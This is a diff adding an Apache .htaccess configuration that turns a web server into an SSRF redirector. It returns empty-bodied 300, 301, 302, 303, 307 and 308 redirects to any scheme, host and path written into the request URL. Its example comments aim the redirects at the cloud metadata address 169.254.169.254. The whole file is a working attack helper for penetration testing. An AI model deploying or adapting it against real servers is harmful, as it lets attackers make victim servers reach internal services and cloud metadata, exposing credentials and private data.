@@ -1,0 +1,52 @@
+# Set blank response body
+ErrorDocument 300 " "
+ErrorDocument 301 " "
+ErrorDocument 302 " "
+ErrorDocument 303 " "
+ErrorDocument 307 " "
+ErrorDocument 308 " "
+
+# 300 without response body
+# http://ssrf.localdomain.pw/xml-without-body/300-http-169.254.169.254:80-.j.xml
+# http://ssrf.localdomain.pw/xml-without-body/300-http-169.254.169.254:80-test/.j.xml
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 300-([^/-]*)-([^/-]*)-(.*).j.xml$
+RewriteRule 300-([^/-]*)-([^/-]*)-(.*).j.xml$ $1://$2/$3 [L,R=300,NC]
+
+# 301 without response body
+# http://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.j.xml
+# http://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-test/.j.xml
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 301-([^/-]*)-([^/-]*)-(.*).j.xml$
+RewriteRule 301-([^/-]*)-([^/-]*)-(.*).j.xml$ $1://$2/$3 [L,R=301,NC]
+
+# 302 without response body
+# http://ssrf.localdomain.pw/xml-without-body/302-http-169.254.169.254:80-.j.xml
+# http://ssrf.localdomain.pw/xml-without-body/302-http-169.254.169.254:80-test/.j.xml
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 302-([^/-]*)-([^/-]*)-(.*).j.xml$
+RewriteRule 302-([^/-]*)-([^/-]*)-(.*).j.xml$ $1://$2/$3 [L,R=302,NC]
+
+# 303 without response body
+# http://ssrf.localdomain.pw/xml-without-body/303-http-169.254.169.254:80-.j.xml
+# http://ssrf.localdomain.pw/xml-without-body/303-http-169.254.169.254:80-test/.j.xml
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 303-([^/-]*)-([^/-]*)-(.*).j.xml$
+RewriteRule 303-([^/-]*)-([^/-]*)-(.*).j.xml$ $1://$2/$3 [L,R=303,NC]
+
+# 307 without response body
+# http://ssrf.localdomain.pw/xml-without-body/307-http-169.254.169.254:80-.j.xml
+# http://ssrf.localdomain.pw/xml-without-body/307-http-169.254.169.254:80-test/.j.xml
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 307-([^/-]*)-([^/-]*)-(.*).j.xml$
+RewriteRule 307-([^/-]*)-([^/-]*)-(.*).j.xml$ $1://$2/$3 [L,R=307,NC]
+
+# 308 without response body
+# http://ssrf.localdomain.pw/xml-without-body/308-http-169.254.169.254:80-.j.xml
+# http://ssrf.localdomain.pw/xml-without-body/308-http-169.254.169.254:80-test/.j.xml
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 308-([^/-]*)-([^/-]*)-(.*).j.xml$
+RewriteRule 308-([^/-]*)-([^/-]*)-(.*).j.xml$ $1://$2/$3 [L,R=308,NC]
+
+# Always set the Content-Type header text/html
+Header always set Content-Type text/html
